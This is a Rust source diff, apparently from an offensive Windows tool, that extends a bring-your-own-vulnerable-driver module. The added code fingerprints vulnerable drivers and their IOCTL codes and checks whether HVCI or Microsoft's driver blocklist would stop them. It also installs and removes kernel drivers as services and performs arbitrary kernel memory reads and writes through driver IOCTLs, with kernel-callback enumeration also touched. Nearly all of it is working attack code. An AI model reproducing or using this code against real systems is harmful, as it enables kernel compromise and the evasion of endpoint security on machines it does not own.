@@ -3,11 +3,335 @@
 use crate::bruteforce::kernel_rw::{kernel_arbitrary_read, kernel_arbitrary_write};
 use crate::byovd::ByovdDriver;
 use crate::error::MemoricError;
+use crate::kernel_offsets::{resolve_callback_offset, CallbackOffsetKind};
+use serde_json::json;
 use serde_json::Value;
 
 /// Helper: iterate all device paths for a ByovdDriver (primary + alternates)
 fn device_paths<'a>(d: &'a ByovdDriver) -> impl Iterator<Item = &'a str> {
     std::iter::once(d.device_path).chain(d.alt_device_paths.iter().copied())
+}
+
+fn matching_byovd_driver(device_path: &str) -> Option<&'static ByovdDriver> {
+    crate::byovd::BYOVD_DRIVERS
+        .iter()
+        .find(|fp| device_paths(fp).any(|candidate| device_path.eq_ignore_ascii_case(candidate)))
+}
+
+fn optional_u32_arg(args: &Value, keys: &[&str]) -> Option<u32> {
+    keys.iter().find_map(|key| {
+        parse_optional_u64_arg(args, key).and_then(|value| u32::try_from(value).ok())
+    })
+}
+
+fn byovd_device_open_probe(device_path: &str) -> Value {
+    use windows::core::PCWSTR;
+    use windows::Win32::Storage::FileSystem::{
+        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, OPEN_EXISTING,
+    };
+
+    let dev_w: Vec<u16> = device_path
+        .encode_utf16()
+        .chain(std::iter::once(0))
+        .collect();
+    let opened = unsafe {
+        CreateFileW(
+            PCWSTR(dev_w.as_ptr()),
+            FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
+            windows::Win32::Storage::FileSystem::FILE_SHARE_NONE,
+            None,
+            OPEN_EXISTING,
+            FILE_ATTRIBUTE_NORMAL,
+            None,
+        )
+    };
+
+    match opened {
+        Ok(handle) => {
+            let _ = unsafe { windows::Win32::Foundation::CloseHandle(handle) };
+            json!({
+                "attempted": true,
+                "opened": true,
+                "error": Value::Null,
+            })
+        }
+        Err(err) => json!({
+            "attempted": true,
+            "opened": false,
+            "error": err.to_string(),
+        }),
+    }
+}
+
+pub fn byovd_preflight_json(args: &Value) -> Value {
+    let device_path = args
+        .get("device_path")
+        .and_then(|value| value.as_str())
+        .unwrap_or("")
+        .trim();
+    let probe_device_open = args
+        .get("probe_device_open")
+        .and_then(|value| value.as_bool())
+        .unwrap_or(false);
+    let read_ioctl = optional_u32_arg(args, &["read_ioctl", "ioctl_read_code", "ioctl_code"]);
+    let write_ioctl = optional_u32_arg(args, &["write_ioctl", "ioctl_write_code", "ioctl_code"]);
+    let matched = matching_byovd_driver(device_path);
+    let read_matches =
+        matched.is_some_and(|fp| read_ioctl.is_some_and(|ioctl| ioctl == fp.read_ioctl));
+    let write_matches =
+        matched.is_some_and(|fp| write_ioctl.is_some_and(|ioctl| ioctl == fp.write_ioctl));
+    let known_contract = matched.is_some();
+    let ioctl_contract = if known_contract {
+        read_matches || write_matches
+    } else {
+        read_ioctl.is_some() || write_ioctl.is_some()
+    };
+    let open_probe = if probe_device_open && !device_path.is_empty() {
+        byovd_device_open_probe(device_path)
+    } else {
+        json!({
+            "attempted": false,
+            "opened": null,
+            "error": Value::Null,
+            "reason": if device_path.is_empty() {
+                "device_path_missing"
+            } else {
+                "probe_device_open_false"
+            }
+        })
+    };
+
+    json!({
+        "schema_version": 1,
+        "kind": "byovd_preflight",
+        "probe_only": true,
+        "ioctl_executed": false,
+        "device_path": if device_path.is_empty() { Value::Null } else { json!(device_path) },
+        "matched_driver": matched.map(|fp| json!({
+            "name": fp.name,
+            "device_path": fp.device_path,
+            "alt_device_paths": fp.alt_device_paths,
+            "filenames": fp.filenames,
+            "read_ioctl": format!("0x{:08X}", fp.read_ioctl),
+            "write_ioctl": format!("0x{:08X}", fp.write_ioctl),
+            "description": fp.description,
+        })).unwrap_or(Value::Null),
+        "provided_ioctl": {
+            "read": read_ioctl.map(|ioctl| format!("0x{:08X}", ioctl)),
+            "write": write_ioctl.map(|ioctl| format!("0x{:08X}", ioctl)),
+        },
+        "contract": {
+            "known_driver": known_contract,
+            "read_ioctl_matches_database": read_matches,
+            "write_ioctl_matches_database": write_matches,
+            "ioctl_contract_available": ioctl_contract,
+            "confidence": if read_matches || write_matches {
+                "known-matching"
+            } else if known_contract {
+                "known-device-mismatched-or-missing-ioctl"
+            } else if ioctl_contract {
+                "custom-device-operator-supplied-ioctl"
+            } else {
+                "custom-device-missing-ioctl"
+            }
+        },
+        "device_open": open_probe,
+        "safe_for_unknown_driver": true,
+        "message": "BYOVD preflight identified the device and IOCTL contract without issuing driver IOCTLs"
+    })
+}
+
+fn driver_blocklist_assessment(fp: &ByovdDriver, driver_readiness: &Value) -> Value {
+    let wdac = &driver_readiness["wdac"];
+    let readiness = &driver_readiness["readiness"];
+    let hvci_enabled = readiness["likely_blocked_by_hvci"]
+        .as_bool()
+        .or_else(|| wdac["hvci_enabled"].as_bool());
+    let vulnerable_blocklist_enabled = readiness["likely_blocked_by_vulnerable_driver_blocklist"]
+        .as_bool()
+        .or_else(|| wdac["vulnerable_driver_blocklist_enabled"].as_bool());
+    let test_signing_active = driver_readiness["signing"]["test_signing_active"]
+        .as_bool()
+        .unwrap_or(false);
+
+    let mut reasons = Vec::new();
+    if hvci_enabled == Some(true) {
+        reasons.push(json!({
+            "code": "hvci_enabled",
+            "message": "HVCI appears enabled; test-signed and vulnerable driver loading is likely blocked."
+        }));
+    }
+    if vulnerable_blocklist_enabled == Some(true) {
+        reasons.push(json!({
+            "code": "vulnerable_driver_blocklist_enabled",
+            "message": "The vulnerable driver blocklist appears enabled; this BYOVD fingerprint may be blocked by policy."
+        }));
+    }
+    if !test_signing_active {
+        reasons.push(json!({
+            "code": "test_signing_not_active",
+            "message": "Test signing is not reported active; unsigned test drivers are unlikely to load unless properly signed."
+        }));
+    }
+
+    let likely_blocked = hvci_enabled == Some(true) || vulnerable_blocklist_enabled == Some(true);
+    json!({
+        "driver": fp.name,
+        "likely_blocked": likely_blocked,
+        "confidence": if hvci_enabled.is_some() || vulnerable_blocklist_enabled.is_some() { "medium" } else { "low" },
+        "reasons": reasons,
+        "signals": {
+            "hvci_enabled": hvci_enabled,
+            "vulnerable_driver_blocklist_enabled": vulnerable_blocklist_enabled,
+            "test_signing_active": test_signing_active,
+            "wdac_source": wdac["source"].clone(),
+            "wdac_note": wdac["note"].clone()
+        }
+    })
+}
+
+fn annotate_driver_candidate(candidate: &mut Value, fp: &ByovdDriver, driver_readiness: &Value) {
+    let assessment = driver_blocklist_assessment(fp, driver_readiness);
+    if let Some(obj) = candidate.as_object_mut() {
+        obj.insert(
+            "likely_blocked".to_string(),
+            assessment["likely_blocked"].clone(),
+        );
+        obj.insert("blocklist_evidence".to_string(), assessment);
+    }
+}
+
+const WIN32_ERROR_SERVICE_ALREADY_RUNNING: u32 = 1056;
+const WIN32_ERROR_SERVICE_DOES_NOT_EXIST: u32 = 1060;
+const WIN32_ERROR_SERVICE_MARKED_FOR_DELETE: u32 = 1072;
+
+#[derive(Debug)]
+struct KernelDriverLifecycle {
+    operation: &'static str,
+    service_name: String,
+    driver_path: Option<String>,
+    failed_stage: Option<&'static str>,
+    steps: Vec<Value>,
+    cleanup: Vec<Value>,
+}
+
+impl KernelDriverLifecycle {
+    fn new(operation: &'static str, service_name: &str, driver_path: Option<&str>) -> Self {
+        Self {
+            operation,
+            service_name: service_name.to_string(),
+            driver_path: driver_path.map(str::to_string),
+            failed_stage: None,
+            steps: Vec::new(),
+            cleanup: Vec::new(),
+        }
+    }
+
+    fn record(&mut self, stage: &'static str, success: bool, detail: impl Into<String>) {
+        if !success && self.failed_stage.is_none() {
+            self.failed_stage = Some(stage);
+        }
+        self.steps.push(json!({
+            "stage": stage,
+            "success": success,
+            "detail": detail.into(),
+        }));
+    }
+
+    fn record_cleanup(&mut self, stage: &'static str, success: bool, detail: impl Into<String>) {
+        self.cleanup.push(json!({
+            "stage": stage,
+            "success": success,
+            "detail": detail.into(),
+        }));
+    }
+
+    fn to_json(&self) -> Value {
+        json!({
+            "operation": self.operation,
+            "service_name": self.service_name,
+            "driver_path": self.driver_path,
+            "failed_stage": self.failed_stage,
+            "steps": self.steps,
+            "cleanup": self.cleanup,
+        })
+    }
+}
+
+fn service_error_matches(error: &windows::core::Error, win32_codes: &[u32]) -> bool {
+    let code = error.code().0 as u32;
+    win32_codes
+        .iter()
+        .any(|&win32| code == win32 || code == hresult_from_win32(win32))
+}
+
+fn hresult_from_win32(code: u32) -> u32 {
+    if code == 0 {
+        0
+    } else {
+        (code & 0x0000_FFFF) | 0x8007_0000
+    }
+}
+
+fn driver_lifecycle_failure(
+    technique: &str,
+    lifecycle: &KernelDriverLifecycle,
+    message: impl Into<String>,
+) -> Value {
+    json!({
+        "success": false,
+        "technique": technique,
+        "service_name": lifecycle.service_name,
+        "driver_path": lifecycle.driver_path,
+        "failed_stage": lifecycle.failed_stage,
+        "lifecycle": lifecycle.to_json(),
+        "message": message.into(),
+    })
+}
+
+fn require_u64_arg(args: &Value, key: &str) -> Result<u64, MemoricError> {
+    crate::args::parse_u64_value(args.get(key))
+        .ok_or_else(|| MemoricError::WindowsApi(format!("Missing or invalid {}", key)))
+}
+
+fn require_u32_arg(args: &Value, key: &str) -> Result<u32, MemoricError> {
+    let value = require_u64_arg(args, key)?;
+    u32::try_from(value)
+        .map_err(|_| MemoricError::WindowsApi(format!("{} is outside u32 range", key)))
+}
+
+fn require_address_arg(args: &Value, key: &str) -> Result<u64, MemoricError> {
+    crate::args::parse_address_value(args.get(key))
+        .ok_or_else(|| MemoricError::WindowsApi(format!("Missing or invalid {}", key)))
+}
+
+fn parse_optional_u64_arg(args: &Value, key: &str) -> Option<u64> {
+    crate::args::parse_u64_value(args.get(key))
+}
+
+fn parse_optional_address_arg(args: &Value, key: &str) -> Option<u64> {
+    crate::args::parse_address_value(args.get(key))
+}
+
+fn require_bytes_arg(
+    args: &Value,
+    key_primary: &str,
+    key_alias: Option<&str>,
+) -> Result<Vec<u8>, MemoricError> {
+    let value = args
+        .get(key_primary)
+        .or_else(|| key_alias.and_then(|alias| args.get(alias)));
+    let value = value.ok_or_else(|| {
+        let expected = match key_alias {
+            Some(alias) => format!("{}/{}", key_primary, alias),
+            None => key_primary.to_string(),
+        };
+        MemoricError::WindowsApi(format!("Missing {}", expected))
+    })?;
+
+    crate::args::parse_bytes_value(value, crate::args::DEFAULT_MAX_BYTES).map_err(|err| {
+        MemoricError::WindowsApi(format!("Invalid {} byte payload: {}", key_primary, err))
+    })
 }
 
 /// Discover vulnerable drivers already loaded or present on disk
@@ -18,11 +342,15 @@ pub fn discover_vulnerable_drivers(args: &Value) -> Result<Value, MemoricError> 
     };
     use windows::Win32::System::ProcessStatus::{EnumDeviceDrivers, GetDeviceDriverBaseNameW};
 
+    let runtime = crate::runtime::RuntimeContext::from_args(args).map_err(MemoricError::Other)?;
     tracing::warn!("[KERNEL] Discovering vulnerable drivers (BYOVD)");
+    runtime.mark_running(None, "driver_discover: enumerating loaded drivers");
 
+    let driver_readiness = crate::capability::driver_readiness_json();
     let mut found_drivers = Vec::new();
 
     // Step 1: Enumerate running drivers
+    let mut loaded_driver_count = 0usize;
     unsafe {
         let mut drivers = vec![std::ptr::null_mut::<std::ffi::c_void>(); 1024];
         let mut cb_needed = 0u32;
@@ -35,8 +363,17 @@ pub fn discover_vulnerable_drivers(args: &Value) -> Result<Value, MemoricError> 
         .is_ok()
         {
             let count = cb_needed as usize / std::mem::size_of::<*mut std::ffi::c_void>();
+            loaded_driver_count = count;
+            runtime.mark_running(
+                Some((loaded_driver_count + 3) as u64),
+                format!(
+                    "driver_discover: checking {} loaded drivers",
+                    loaded_driver_count
+                ),
+            );
 
             for i in 0..count {
+                runtime.check().map_err(MemoricError::Other)?;
                 let mut name_buf = [0u16; 260];
                 let name_len = GetDeviceDriverBaseNameW(drivers[i], &mut name_buf);
                 if name_len == 0 {
@@ -71,7 +408,7 @@ pub fn discover_vulnerable_drivers(args: &Value) -> Result<Value, MemoricError> 
                                 }
                             }
 
-                            found_drivers.push(serde_json::json!({
+                            let mut candidate = json!({
                                 "name": fp.name,
                                 "filename": driver_name,
                                 "status": "loaded",
@@ -80,10 +417,26 @@ pub fn discover_vulnerable_drivers(args: &Value) -> Result<Value, MemoricError> 
                                 "read_ioctl": format!("0x{:08X}", fp.read_ioctl),
                                 "write_ioctl": format!("0x{:08X}", fp.write_ioctl),
                                 "description": fp.description,
-                            }));
+                            });
+                            annotate_driver_candidate(&mut candidate, fp, &driver_readiness);
+                            found_drivers.push(candidate);
                             break;
                         }
                     }
+                }
+
+                let current = i as u64 + 1;
+                if current == count as u64 || current % 32 == 0 {
+                    runtime.update_progress(
+                        current,
+                        Some((loaded_driver_count + 3) as u64),
+                        format!(
+                            "driver_discover: checked {}/{} loaded drivers, {} candidates",
+                            current,
+                            count,
+                            found_drivers.len()
+                        ),
+                    );
                 }
             }
         }
@@ -96,9 +449,21 @@ pub fn discover_vulnerable_drivers(args: &Value) -> Result<Value, MemoricError> 
         "C:\\Users\\Public",
     ];
 
-    for &search_dir in &search_paths {
+    let total_work = loaded_driver_count as u64 + search_paths.len() as u64;
+    runtime.update_progress(
+        loaded_driver_count as u64,
+        Some(total_work),
+        format!(
+            "driver_discover: loaded-driver check complete, {} candidates",
+            found_drivers.len()
+        ),
+    );
+
+    for (path_idx, search_dir) in search_paths.iter().enumerate() {
+        runtime.check().map_err(MemoricError::Other)?;
         if let Ok(entries) = std::fs::read_dir(search_dir) {
             for entry in entries.flatten() {
+                runtime.check().map_err(MemoricError::Other)?;
                 let file_name = entry.file_name().to_string_lossy().to_string();
                 if !file_name.to_lowercase().ends_with(".sys") {
                     continue;
@@ -113,7 +478,7 @@ pub fn discover_vulnerable_drivers(args: &Value) -> Result<Value, MemoricError> 
                                     && d.get("status").and_then(|v| v.as_str()) == Some("loaded")
                             });
                             if !already_found {
-                                found_drivers.push(serde_json::json!({
+                                let mut candidate = json!({
                                     "name": fp.name,
                                     "filename": file_name,
                                     "status": "on_disk",
@@ -123,7 +488,9 @@ pub fn discover_vulnerable_drivers(args: &Value) -> Result<Value, MemoricError> 
                                     "read_ioctl": format!("0x{:08X}", fp.read_ioctl),
                                     "write_ioctl": format!("0x{:08X}", fp.write_ioctl),
                                     "description": fp.description,
-                                }));
+                                });
+                                annotate_driver_candidate(&mut candidate, fp, &driver_readiness);
+                                found_drivers.push(candidate);
                             }
                             break;
                         }
@@ -131,7 +498,25 @@ pub fn discover_vulnerable_drivers(args: &Value) -> Result<Value, MemoricError> 
                 }
             }
         }
+        runtime.update_progress(
+            loaded_driver_count as u64 + path_idx as u64 + 1,
+            Some(total_work),
+            format!(
+                "driver_discover: scanned {}/{} disk locations, {} candidates",
+                path_idx + 1,
+                search_paths.len(),
+                found_drivers.len()
+            ),
+        );
     }
+    runtime.update_progress(
+        total_work,
+        Some(total_work),
+        format!(
+            "driver_discover: complete, {} candidates",
+            found_drivers.len()
+        ),
+    );
 
     Ok(serde_json::json!({
         "success": true,
@@ -139,6 +524,11 @@ pub fn discover_vulnerable_drivers(args: &Value) -> Result<Value, MemoricError> 
         "found": found_drivers.len(),
         "drivers": found_drivers,
         "database_size": crate::byovd::BYOVD_DRIVERS.len(),
+        "blocklist_context": {
+            "readiness": driver_readiness["readiness"].clone(),
+            "wdac": driver_readiness["wdac"].clone(),
+            "signing": driver_readiness["signing"].clone()
+        },
         "message": format!("Found {} vulnerable drivers ({} in database)", found_drivers.len(), crate::byovd::BYOVD_DRIVERS.len())
     }))
 }
@@ -359,9 +749,9 @@ pub fn verify_driver(args: &Value) -> Result<Value, MemoricError> {
 pub fn load_driver(args: &Value) -> Result<Value, MemoricError> {
     use windows::core::PCWSTR;
     use windows::Win32::System::Services::{
-        CloseServiceHandle, CreateServiceW, OpenSCManagerW, StartServiceW,
-        SC_MANAGER_CREATE_SERVICE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
-        SERVICE_KERNEL_DRIVER, SERVICE_START,
+        CloseServiceHandle, CreateServiceW, OpenSCManagerW, OpenServiceW, StartServiceW,
+        SC_MANAGER_CREATE_SERVICE, SERVICE_ALL_ACCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
+        SERVICE_KERNEL_DRIVER,
     };
 
     let driver_path = args
@@ -383,9 +773,23 @@ pub fn load_driver(args: &Value) -> Result<Value, MemoricError> {
         service_name
     );
 
+    let mut lifecycle = KernelDriverLifecycle::new("load", service_name, Some(driver_path));
+
     unsafe {
-        let scm = OpenSCManagerW(None, None, SC_MANAGER_CREATE_SERVICE)
-            .map_err(|e| MemoricError::WindowsApi(format!("OpenSCManager: {} (need admin)", e)))?;
+        let scm = match OpenSCManagerW(None, None, SC_MANAGER_CREATE_SERVICE) {
+            Ok(scm) => {
+                lifecycle.record("open_scm", true, "SCM opened");
+                scm
+            }
+            Err(e) => {
+                lifecycle.record("open_scm", false, format!("{} (need admin)", e));
+                return Ok(driver_lifecycle_failure(
+                    "load_driver",
+                    &lifecycle,
+                    format!("OpenSCManager failed: {} (need admin)", e),
+                ));
+            }
+        };
 
         let svc_name: Vec<u16> = service_name
             .encode_utf16()
@@ -396,11 +800,11 @@ pub fn load_driver(args: &Value) -> Result<Value, MemoricError> {
             .chain(std::iter::once(0))
             .collect();
 
-        let service = CreateServiceW(
+        let service_result = CreateServiceW(
             scm,
             PCWSTR(svc_name.as_ptr()),
             PCWSTR(svc_name.as_ptr()),
-            SERVICE_START,
+            SERVICE_ALL_ACCESS,
             SERVICE_KERNEL_DRIVER,
             SERVICE_DEMAND_START,
             SERVICE_ERROR_IGNORE,
@@ -412,28 +816,84 @@ pub fn load_driver(args: &Value) -> Result<Value, MemoricError> {
             None,
         );
 
-        let service = match service {
-            Ok(s) => s,
+        let service = match service_result {
+            Ok(s) => {
+                lifecycle.record("create_service", true, "service created");
+                s
+            }
             Err(e) => {
+                lifecycle.steps.push(json!({
+                    "stage": "create_service",
+                    "success": false,
+                    "detail": format!("create failed; trying existing service: {}", e),
+                }));
                 // If service already exists, try to open it
-                let service = windows::Win32::System::Services::OpenServiceW(
-                    scm,
-                    PCWSTR(svc_name.as_ptr()),
-                    SERVICE_START,
-                )
-                .map_err(|_| {
-                    MemoricError::WindowsApi(format!("CreateService/OpenService: {}", e))
-                })?;
-                service
+                match OpenServiceW(scm, PCWSTR(svc_name.as_ptr()), SERVICE_ALL_ACCESS) {
+                    Ok(service) => {
+                        lifecycle.record("open_existing_service", true, "existing service opened");
+                        service
+                    }
+                    Err(open_err) => {
+                        lifecycle.record("open_existing_service", false, open_err.to_string());
+                        let scm_closed = CloseServiceHandle(scm).is_ok();
+                        lifecycle.record_cleanup(
+                            "close_scm",
+                            scm_closed,
+                            format!("closed={}", scm_closed),
+                        );
+                        return Ok(driver_lifecycle_failure(
+                            "load_driver",
+                            &lifecycle,
+                            format!("CreateService/OpenService failed: {}; {}", e, open_err),
+                        ));
+                    }
+                }
             }
         };
 
-        let start_result = StartServiceW(service, None);
-        let started = start_result.is_ok();
-        let start_error = start_result.err().map(|e| format!("{}", e));
+        let (started, start_error) = match StartServiceW(service, None) {
+            Ok(()) => {
+                lifecycle.record("start_service", true, "service started");
+                (true, None)
+            }
+            Err(e) if service_error_matches(&e, &[WIN32_ERROR_SERVICE_ALREADY_RUNNING]) => {
+                lifecycle.record(
+                    "start_service",
+                    true,
+                    format!("service already running: {}", e),
+                );
+                (true, Some(format!("{}", e)))
+            }
+            Err(e) => {
+                lifecycle.record("start_service", false, e.to_string());
+                let service_closed = CloseServiceHandle(service).is_ok();
+                let scm_closed = CloseServiceHandle(scm).is_ok();
+                lifecycle.record_cleanup(
+                    "close_handles",
+                    service_closed && scm_closed,
+                    format!(
+                        "service_closed={}, scm_closed={}",
+                        service_closed, scm_closed
+                    ),
+                );
+                return Ok(driver_lifecycle_failure(
+                    "load_driver",
+                    &lifecycle,
+                    format!("StartService failed: {}", e),
+                ));
+            }
+        };
 
-        let _ = CloseServiceHandle(service);
-        let _ = CloseServiceHandle(scm);
+        let service_closed = CloseServiceHandle(service).is_ok();
+        let scm_closed = CloseServiceHandle(scm).is_ok();
+        lifecycle.record_cleanup(
+            "close_handles",
+            service_closed && scm_closed,
+            format!(
+                "service_closed={}, scm_closed={}",
+                service_closed, scm_closed
+            ),
+        );
 
         let device_path = format!("\\\\.\\{}", device_name);
 
@@ -462,6 +922,7 @@ pub fn load_driver(args: &Value) -> Result<Value, MemoricError> {
         } else {
             None
         };
+        lifecycle.record("complete", true, "driver load request completed");
 
         let mut result = serde_json::json!({
             "success": true,
@@ -471,6 +932,7 @@ pub fn load_driver(args: &Value) -> Result<Value, MemoricError> {
             "device_path": device_path,
             "started": started,
             "start_error": start_error,
+            "lifecycle": lifecycle.to_json(),
             "message": format!("Driver {} loaded, device: {}", service_name, device_path)
         });
 
@@ -506,19 +968,74 @@ pub fn unload_driver(args: &Value) -> Result<Value, MemoricError> {
         delete_file
     );
 
+    let mut lifecycle = KernelDriverLifecycle::new("unload", service_name, None);
+
     unsafe {
-        let scm = OpenSCManagerW(None, None, SC_MANAGER_ALL_ACCESS)
-            .map_err(|e| MemoricError::WindowsApi(format!("OpenSCManager: {}", e)))?;
+        let scm = match OpenSCManagerW(None, None, SC_MANAGER_ALL_ACCESS) {
+            Ok(scm) => {
+                lifecycle.record("open_scm", true, "SCM opened");
+                scm
+            }
+            Err(e) => {
+                lifecycle.record("open_scm", false, e.to_string());
+                return Ok(driver_lifecycle_failure(
+                    "unload_driver",
+                    &lifecycle,
+                    format!("OpenSCManager failed: {}", e),
+                ));
+            }
+        };
 
         let svc_name: Vec<u16> = service_name
             .encode_utf16()
             .chain(std::iter::once(0))
             .collect();
-        let service =
-            OpenServiceW(scm, PCWSTR(svc_name.as_ptr()), SERVICE_ALL_ACCESS).map_err(|e| {
-                let _ = CloseServiceHandle(scm);
-                MemoricError::WindowsApi(format!("OpenService: {}", e))
-            })?;
+        let service = match OpenServiceW(scm, PCWSTR(svc_name.as_ptr()), SERVICE_ALL_ACCESS) {
+            Ok(service) => {
+                lifecycle.record("open_existing_service", true, "existing service opened");
+                service
+            }
+            Err(e) => {
+                let absent = service_error_matches(
+                    &e,
+                    &[
+                        WIN32_ERROR_SERVICE_DOES_NOT_EXIST,
+                        WIN32_ERROR_SERVICE_MARKED_FOR_DELETE,
+                    ],
+                );
+                lifecycle.record(
+                    "open_existing_service",
+                    absent,
+                    if absent {
+                        format!("service already absent: {}", e)
+                    } else {
+                        e.to_string()
+                    },
+                );
+                let scm_closed = CloseServiceHandle(scm).is_ok();
+                lifecycle.record_cleanup("close_scm", scm_closed, format!("closed={}", scm_closed));
+                if !absent {
+                    return Ok(driver_lifecycle_failure(
+                        "unload_driver",
+                        &lifecycle,
+                        format!("OpenService failed: {}", e),
+                    ));
+                }
+                lifecycle.record("complete", true, "nothing to unload");
+                return Ok(serde_json::json!({
+                    "success": true,
+                    "technique": "unload_driver",
+                    "service_name": service_name,
+                    "stopped": false,
+                    "service_deleted": false,
+                    "file_deleted": false,
+                    "binary_path": "",
+                    "idempotent": true,
+                    "lifecycle": lifecycle.to_json(),
+                    "message": format!("Driver {} was already absent or inaccessible", service_name)
+                }));
+            }
+        };
 
         // Query binary path before deletion (for delete_file)
         let mut binary_path_str = String::new();
@@ -542,19 +1059,50 @@ pub fn unload_driver(args: &Value) -> Result<Value, MemoricError> {
                 }
             }
         }
+        lifecycle.driver_path = if binary_path_str.is_empty() {
+            None
+        } else {
+            Some(binary_path_str.clone())
+        };
 
         // Stop the service
         let mut status = SERVICE_STATUS::default();
         let stopped = ControlService(service, SERVICE_CONTROL_STOP, &mut status).is_ok();
+        lifecycle.record(
+            "stop_service",
+            true,
+            if stopped {
+                "stop requested".to_string()
+            } else {
+                "stop skipped or service already stopped".to_string()
+            },
+        );
 
         // Wait briefly for stop
         std::thread::sleep(std::time::Duration::from_millis(500));
 
         // Delete the service
         let deleted = DeleteService(service).is_ok();
+        lifecycle.record(
+            "delete_service",
+            true,
+            if deleted {
+                "service deleted".to_string()
+            } else {
+                "delete skipped or service already deleted".to_string()
+            },
+        );
 
-        let _ = CloseServiceHandle(service);
-        let _ = CloseServiceHandle(scm);
+        let service_closed = CloseServiceHandle(service).is_ok();
+        let scm_closed = CloseServiceHandle(scm).is_ok();
+        lifecycle.record_cleanup(
+            "close_handles",
+            service_closed && scm_closed,
+            format!(
+                "service_closed={}, scm_closed={}",
+                service_closed, scm_closed
+            ),
+        );
 
         // Delete the driver file if requested
         let mut file_deleted = false;
@@ -566,11 +1114,14 @@ pub fn unload_driver(args: &Value) -> Result<Value, MemoricError> {
 
             if std::fs::remove_file(&clean_path).is_ok() {
                 file_deleted = true;
+                lifecycle.record_cleanup("delete_driver_file", true, clean_path.clone());
                 tracing::info!("[KERNEL] Deleted driver file: {}", clean_path);
             } else {
+                lifecycle.record_cleanup("delete_driver_file", false, clean_path.clone());
                 tracing::warn!("[KERNEL] Failed to delete driver file: {}", clean_path);
             }
         }
+        lifecycle.record("complete", true, "driver unload request completed");
 
         Ok(serde_json::json!({
             "success": true,
@@ -580,6 +1131,7 @@ pub fn unload_driver(args: &Value) -> Result<Value, MemoricError> {
             "service_deleted": deleted,
             "file_deleted": file_deleted,
             "binary_path": binary_path_str,
+            "lifecycle": lifecycle.to_json(),
             "message": format!("Driver {} stopped: {}, deleted: {}, file_deleted: {}", service_name, stopped, deleted, file_deleted)
         }))
     }
@@ -597,17 +1149,21 @@ pub fn driver_read_memory(args: &Value) -> Result<Value, MemoricError> {
         .get("device_path")
         .and_then(|v| v.as_str())
         .ok_or_else(|| MemoricError::WindowsApi("Missing device_path".to_string()))?;
-    let ioctl_code = args
-        .get("ioctl_code")
-        .and_then(|v| v.as_u64())
-        .ok_or_else(|| MemoricError::WindowsApi("Missing ioctl_code".to_string()))?
-        as u32;
-    let address = args
-        .get("address")
-        .and_then(|v| v.as_u64())
-        .ok_or_else(|| MemoricError::WindowsApi("Missing address".to_string()))?;
-    let size = args.get("size").and_then(|v| v.as_u64()).unwrap_or(8) as usize;
-    let input_struct = args.get("input_struct").and_then(|v| v.as_array());
+    let ioctl_code = require_u32_arg(args, "ioctl_code")?;
+    let address = require_address_arg(args, "address")?;
+    let size_u64 = parse_optional_u64_arg(args, "size").unwrap_or(8);
+    if size_u64 == 0 {
+        return Err(MemoricError::WindowsApi(
+            "Read size must be greater than 0".to_string(),
+        ));
+    }
+    if size_u64 > 4096 {
+        return Err(MemoricError::WindowsApi(
+            "Read size capped at 4096".to_string(),
+        ));
+    }
+    let size = usize::try_from(size_u64)
+        .map_err(|_| MemoricError::WindowsApi("Read size is too large".to_string()))?;
 
     tracing::warn!(
         "[KERNEL] Driver read: {} IOCTL 0x{:08X} addr 0x{:016X} size {}",
@@ -616,12 +1172,6 @@ pub fn driver_read_memory(args: &Value) -> Result<Value, MemoricError> {
         address,
         size
     );
-
-    if size > 4096 {
-        return Err(MemoricError::WindowsApi(
-            "Read size capped at 4096".to_string(),
-        ));
-    }
 
     unsafe {
         let dev_w: Vec<u16> = device_path
@@ -641,10 +1191,10 @@ pub fn driver_read_memory(args: &Value) -> Result<Value, MemoricError> {
             MemoricError::WindowsApi(format!("Cannot open device {}: {}", device_path, e))
         })?;
 
-        let input: Vec<u8> = if let Some(raw) = input_struct {
-            raw.iter()
-                .filter_map(|v| v.as_u64().map(|b| b as u8))
-                .collect()
+        let input: Vec<u8> = if let Some(raw) = args.get("input_struct") {
+            crate::args::parse_bytes_value(raw, crate::args::DEFAULT_MAX_BYTES).map_err(|err| {
+                MemoricError::WindowsApi(format!("Invalid input_struct byte payload: {}", err))
+            })?
         } else {
             // Default: pass address as u64 LE
             address.to_le_bytes().to_vec()
@@ -696,26 +1246,9 @@ pub fn driver_write_memory(args: &Value) -> Result<Value, MemoricError> {
         .get("device_path")
         .and_then(|v| v.as_str())
         .ok_or_else(|| MemoricError::WindowsApi("Missing device_path".to_string()))?;
-    let ioctl_code = args
-        .get("ioctl_code")
-        .and_then(|v| v.as_u64())
-        .ok_or_else(|| MemoricError::WindowsApi("Missing ioctl_code".to_string()))?
-        as u32;
-    let address = args
-        .get("address")
-        .and_then(|v| v.as_u64())
-        .ok_or_else(|| MemoricError::WindowsApi("Missing address".to_string()))?;
-    let data = args
-        .get("data")
-        .or_else(|| args.get("bytes"))
-        .and_then(|v| v.as_array())
-        .ok_or_else(|| MemoricError::WindowsApi("Missing data/bytes".to_string()))?;
-    let input_struct = args.get("input_struct").and_then(|v| v.as_array());
-
-    let data_bytes: Vec<u8> = data
-        .iter()
-        .filter_map(|v| v.as_u64().map(|b| b as u8))
-        .collect();
+    let ioctl_code = require_u32_arg(args, "ioctl_code")?;
+    let address = require_address_arg(args, "address")?;
+    let data_bytes = require_bytes_arg(args, "bytes", Some("data"))?;
 
     tracing::warn!(
         "[KERNEL] Driver write: {} IOCTL 0x{:08X} addr 0x{:016X} {} bytes",
@@ -743,10 +1276,10 @@ pub fn driver_write_memory(args: &Value) -> Result<Value, MemoricError> {
             MemoricError::WindowsApi(format!("Cannot open device {}: {}", device_path, e))
         })?;
 
-        let input: Vec<u8> = if let Some(raw) = input_struct {
-            raw.iter()
-                .filter_map(|v| v.as_u64().map(|b| b as u8))
-                .collect()
+        let input: Vec<u8> = if let Some(raw) = args.get("input_struct") {
+            crate::args::parse_bytes_value(raw, crate::args::DEFAULT_MAX_BYTES).map_err(|err| {
+                MemoricError::WindowsApi(format!("Invalid input_struct byte payload: {}", err))
+            })?
         } else {
             // Default: address (u64 LE) + data
             let mut buf = address.to_le_bytes().to_vec();
@@ -794,11 +1327,7 @@ pub fn enum_kernel_callbacks(args: &Value) -> Result<Value, MemoricError> {
         .get("device_path")
         .and_then(|v| v.as_str())
